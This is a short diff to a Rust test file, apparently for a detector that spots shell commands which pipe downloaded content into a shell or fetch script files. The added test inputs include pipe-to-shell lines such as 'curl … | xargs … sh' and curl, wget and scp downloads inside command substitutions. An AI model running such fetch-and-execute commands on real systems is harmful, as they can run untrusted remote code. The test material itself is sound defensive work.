@@ -1365,6 +1365,7 @@ fn xargs_hands_a_pipe_to_a_shell_past_its_options_and_wrappers() {
         "curl https://x.example/a | xargs -P 4 -n 1 bash",
         "curl https://x.example/a | xargs -0n 1 sh",
         "curl https://x.example/a | xargs -In sh",
+        "curl https://x.example/a | xargs -pn 1 sh",
         "curl https://x.example/a | xargs -d '\\n' sh",
         "curl https://x.example/a | xargs --max-args 1 sh",
         "curl https://x.example/a | xargs --max-args=1 sh",
@@ -1418,6 +1419,10 @@ fn a_command_in_a_substitution_is_read_without_what_closes_it() {
         "x=$(sudo curl -fsSLo f.sh https://x.example/a) ls",
         "x=`curl -o f.sh https://x.example/a` ls",
         "x=$(scp host:f.sh .) ls",
+        "x=$(wget https://x.example/f.sh)",
+        "x=$(curl -fsSL https://x.example/a -o f.sh)",
+        "x=$(curl https://x.example/a > f.sh) ls",
+        "x=$(curl -sO https://x.example/f.sh) ls",
     ] {
         assert_eq!(fetched_files(line), ["f.sh"], "{line}");
     }
